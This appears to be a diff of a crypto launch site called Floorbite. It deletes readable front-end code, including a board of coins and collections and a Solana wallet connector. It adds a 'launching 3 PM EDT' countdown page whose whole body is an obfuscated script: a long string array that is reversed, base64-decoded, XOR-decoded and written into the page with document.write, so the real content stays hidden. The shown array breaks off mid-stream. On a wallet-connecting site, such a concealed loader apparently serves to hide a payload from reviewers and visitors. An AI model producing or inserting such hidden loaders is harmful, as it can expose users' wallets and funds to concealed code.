-    var L=el('div'),hd=el('div',null,'bh');hd.appendChild(el('h2','Top coins'));
-    var pg1=el('span',null,'bpg'),p1=el('button','‹'),n1=el('button','›');p1.disabled=n1.disabled=true;p1.setAttribute('aria-label','Previous page');n1.setAttribute('aria-label','Next page');
-    pg1.appendChild(p1);pg1.appendChild(el('span','1 / 1'));pg1.appendChild(n1);hd.appendChild(pg1);L.appendChild(hd);
-    var tb=el('div',null,'btop');tb.appendChild(pills('Sort coins',['Newest','24h volume','Market cap','Fees routed']));tb.appendChild(pills('Filter coins',['All']));L.appendChild(tb);
-    var aw=el('div',null,'await'),at=el('div');at.appendChild(el('h3','Awaiting the first launch'));at.appendChild(el('p','Your coin could be the first to start biting floors.'));aw.appendChild(at);
-    var lb=el('button','Launch a coin','btn ghost');lb.type='button';lb.setAttribute('data-launch','');aw.appendChild(lb);L.appendChild(aw);
-    var sl=el('div',null,'ph3');
-    ['Your coin here','Awaiting launch','Awaiting launch'].forEach(function(t){
-      var c=el('div',null,'slot'),pl=el('div',null,'plus');pl.appendChild(el('span','+'));c.appendChild(pl);
-      var m=el('div',null,'meta');m.appendChild(el('b',t));m.appendChild(el('i'));m.appendChild(el('i'));c.appendChild(m);sl.appendChild(c);
-    });
-    L.appendChild(sl);wrap.appendChild(L);
-    /* collections */
-    var R=el('div'),h2=el('div',null,'bh');h2.appendChild(el('h2','Top collections'));
-    var N=5,pages=Math.ceil(COLL.length/N),cur=1;
-    var pg2=el('span',null,'bpg'),p2=el('button','‹'),n2=el('button','›'),lab=el('span');
-    p2.setAttribute('aria-label','Previous collections');n2.setAttribute('aria-label','Next collections');
-    pg2.appendChild(p2);pg2.appendChild(lab);pg2.appendChild(n2);h2.appendChild(pg2);R.appendChild(h2);
-    var body=el('div');R.appendChild(body);wrap.appendChild(R);
-    function pick(c){LP.coll=c;say(c[0]+' selected. Now name your coin.');location.hash='#/launch'}
-    function draw(){
-      body.textContent='';lab.textContent=cur+' / '+pages;p2.disabled=cur===1;n2.disabled=cur===pages;
-      var items=COLL.slice((cur-1)*N,cur*N),c=items[0];
-      var ft=el('button',null,'feat');ft.type='button';
-      var fh=el('div',null,'fh'),fp=el('span',null,'fp');fp.appendChild(picEl(c,160));fh.appendChild(fp);fh.appendChild(el('span',c[0],'fn'));ft.appendChild(fh);
-      ft.appendChild(el('p','Ready for its first coin.','fr'));ft.appendChild(el('p','Launch a coin to start funding this collection’s NFTs.','fs'));
-      ft.addEventListener('click',function(){pick(c)});body.appendChild(ft);
-      var ls=el('div',null,'blist');
-      items.slice(1).forEach(function(x,i){
-        var r=el('button',null,'brow');r.type='button';r.appendChild(el('span',String((cur-1)*N+i+2),'rk'));
-        var rp=el('span',null,'rp');rp.appendChild(picEl(x,96));r.appendChild(rp);r.appendChild(el('span',x[0],'rn'));r.appendChild(el('span','Awaiting launch','ra'));
-        r.addEventListener('click',function(){pick(x)});ls.appendChild(r);
-      });
-      body.appendChild(ls);
-    }
-    p2.addEventListener('click',function(){if(cur>1){cur--;draw()}});
-    n2.addEventListener('click',function(){if(cur<pages){cur++;draw()}});
-    draw();
-  }
-  buildBoard($('board'));
-  var views=$('views'),home=$('home'),nav=$('nav');
-  Object.keys(PAGES).forEach(function(k){
-    var d=PAGES[k],s=el('section',null,'page');s.id='v-'+k;s.hidden=true;
-    var h=el('h2',d.h||d.t);h.tabIndex=-1;
-    var hd=el('div',null,'phead'),hl=el('div');hl.appendChild(h);hl.appendChild(el('p',d.p,'intro'));hd.appendChild(hl);s.appendChild(hd);
-    if(d.custom==='explore'){buildExplore(s)}
-    if(d.custom==='collections'){buildCollections(s)}
-    if(d.custom==='gallery'){buildGallery(s)}
-    if(d.custom==='receipts'){buildReceipts(s)}
-    if(d.custom==='analytics'){buildAnalytics(s)}
-    if(d.custom==='launch'){buildLaunch(s)}
-    if(d.stats){var g=el('div',null,'stats');d.stats.forEach(function(x){var c=el('div',null,'stat');c.appendChild(el('b',x[1]));c.appendChild(el('span',x[0]));g.appendChild(c)});s.appendChild(g)}
-    if(d.empty){var c=el('div',null,'card');c.appendChild(el('p',d.empty));s.appendChild(c)}
-    if(d.prose){var pr=el('div',null,'prose');d.prose.forEach(function(x){pr.appendChild(el('h3',x[0]));x[1].split('\n\n').forEach(function(t){pr.appendChild(el('p',t))})});s.appendChild(pr)}
-    views.appendChild(s);
-  });
-  function route(){
-    var parts=(location.hash.replace(/^#\/?/,'')||'').split('/');
-    var k=parts[0];
-    var ok=PAGES[k];
-    if(k==='collections')renderCollections(parseInt(parts[1],10)||1);
-    if(k==='launch'&&LP.show)LP.show();
-    home.hidden=!!ok;
-    Object.keys(PAGES).forEach(function(n){$('v-'+n).hidden=(n!==k)});
-    nav.querySelectorAll('a').forEach(function(a){
-      if(ok&&a.getAttribute('href')==='#/'+k)a.setAttribute('aria-current','page');else a.removeAttribute('aria-current');
-    });
-    document.title=(ok?PAGES[k].t+' – ':'')+'Floorbite';
-    window.scrollTo(0,0);
-  }
-  window.addEventListener('hashchange',route);route();
-
-  /* ---------- NFT destination picker ---------- */
-  var db=document.querySelectorAll('#dest button'),res=$('result');
-  db.forEach(function(b){b.addEventListener('click',function(){
-    db.forEach(function(x){x.setAttribute('aria-pressed','false')});
-    b.setAttribute('aria-pressed','true');res.textContent=b.getAttribute('data-msg');
-  })});
-
-  /* ---------- Solana wallet ---------- */
-  var wallet=null,provider=null;
-  var wd=$('wallet');
-  function short(a){return a.slice(0,4)+'…'+a.slice(-4)}
-  function renderWallet(){document.querySelectorAll('[data-wallet]').forEach(function(b){
-    b.textContent=wallet?short(wallet)+' (disconnect)':'Connect wallet';
-  });if(onWallet)onWallet()}
-  function providers(){
-    var w=window,l=[];
-    if(w.phantom&&w.phantom.solana&&w.phantom.solana.isPhantom)l.push({name:'Phantom',p:w.phantom.solana});
-    if(w.solflare&&w.solflare.isSolflare)l.push({name:'Solflare',p:w.solflare});
-    if(w.backpack&&w.backpack.isBackpack)l.push({name:'Backpack',p:w.backpack});
-    if(!l.length&&w.solana&&typeof w.solana.connect==='function')l.push({name:'Solana wallet',p:w.solana});
-    return l;
-  }
-  async function connectWith(x){
-    try{
-      var r=await x.p.connect();
-      var pk=(r&&r.publicKey)||x.p.publicKey;
-      if(!pk)throw new Error('no key');
-      wallet=pk.toString();provider=x.p;
-      renderWallet();wd.close();say('Wallet connected.');
-    }catch(e){say('Connection cancelled or rejected.')}
-  }
-  function buildWalletList(){
-    var list=$('wlist');list.textContent='';
-    var ps=providers();
-    if(ps.length){
-      ps.forEach(function(x){var b=el('button','Connect '+x.name,'btn');b.type='button';b.addEventListener('click',function(){connectWith(x)});list.appendChild(b)});
-      $('whint').textContent='Connecting only shares your public address. It doesn’t move any funds.';
-    }else{
-      var inFrame=false;try{inFrame=window.top!==window.self}catch(e){inFrame=true}
-      var link=function(t,u){var a=el('a',t,'btn');a.href=u;a.target='_blank';a.rel='noopener';return a};
-      list.appendChild(link('Get Phantom','https://phantom.app/download'));
-      list.appendChild(link('Open this page in the Phantom app','https://phantom.app/ul/browse/'+encodeURIComponent(location.href.split('#')[0])+'?ref='+encodeURIComponent(location.origin)));
-      $('whint').textContent=inFrame
-        ?'No wallet found. This page is running inside a frame, which blocks wallet extensions. Open it in its own browser tab.'
-        :'No Solana wallet found. Install a wallet extension such as Phantom, Solflare or Backpack and reload. On a phone, open this page inside the wallet’s built-in browser.';
-    }
-  }
-  function openWallet(){
-    buildWalletList();wd.showModal();
-    if(!providers().length)setTimeout(function(){if(wd.open&&providers().length)buildWalletList()},900);
-  }
-  document.querySelectorAll('[data-wallet]').forEach(function(b){b.addEventListener('click',function(){
-    if(wallet){try{provider&&provider.disconnect&&provider.disconnect()}catch(e){}wallet=null;provider=null;renderWallet();say('Wallet disconnected.')}
-    else openWallet();
-  })});
-
-  /* ---------- launch buttons ---------- */
-  document.querySelectorAll('[data-launch]').forEach(function(b){b.addEventListener('click',function(e){
-    e.preventDefault();location.hash='#/launch';
-  })});
-  document.querySelectorAll('[data-close]').forEach(function(b){b.addEventListener('click',function(){b.closest('dialog').close()})});
-})();
-</script>
-</body>
-</html>
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Floorbite | Launching 3 PM EDT</title>
+<meta name="description" content="Coins that bite NFT floors. Floorbite launches at 3:00 PM EDT.">
+<meta name="theme-color" content="#1E1235">
+<meta property="og:type" content="website"><meta property="og:site_name" content="Floorbite"><meta property="og:title" content="Floorbite launches at 3 PM EDT"><meta property="og:description" content="Coins that bite NFT floors. Countdown is live."><meta property="og:url" content="https://floorbite.xyz/"><meta property="og:image" content="https://floorbite.xyz/og.png">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@floorb1te"><meta name="twitter:title" content="Floorbite launches at 3 PM EDT"><meta name="twitter:description" content="Coins that bite NFT floors. Countdown is live."><meta name="twitter:image" content="https://floorbite.xyz/og.png">
+<link rel="icon" type="image/png" href="favicon.png"><link rel="apple-touch-icon" href="apple-touch-icon.png">
+<style>html,body{margin:0;background:#1E1235}</style>
+</head><body><noscript><p style="color:#fff;font:600 20px sans-serif;text-align:center;margin-top:30vh">Floorbite launches at 3 PM EDT.<br>Enable JavaScript to see the countdown.</p></noscript>
+<script>(function(_0x1a,_0x2b){var _0x3c=_0x1a.join("").split("").reverse().join(""),_0x4d=atob(_0x3c),_0x5e=new Uint8Array(_0x4d.length);for(var _0x6f=0;_0x6f<_0x4d.length;_0x6f++)_0x5e[_0x6f]=_0x4d.charCodeAt(_0x6f)^_0x2b[_0x6f%_0x2b.length];var _0x7a=new TextDecoder("utf-8").decode(_0x5e);document.open();document.write(_0x7a);document.close()})(["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",
